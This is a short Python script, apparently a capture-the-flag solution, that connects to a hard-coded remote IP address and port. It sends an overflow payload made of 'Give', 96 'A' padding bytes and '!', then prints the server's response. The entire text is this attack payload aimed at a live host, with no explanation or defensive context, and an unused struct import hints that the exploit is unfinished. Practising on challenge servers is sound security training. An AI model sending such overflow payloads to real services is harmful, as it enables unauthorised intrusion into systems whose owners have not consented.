# -*- coding: utf-8 -*-
# author = 'K0ctr'


import socket
import struct
import sys

st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
st.connect(('115.238.30.26', 10005))

s = "Give" + "A" * 96 + "!"
st.send((s + "\n").encode())
print(st.recv(4096))
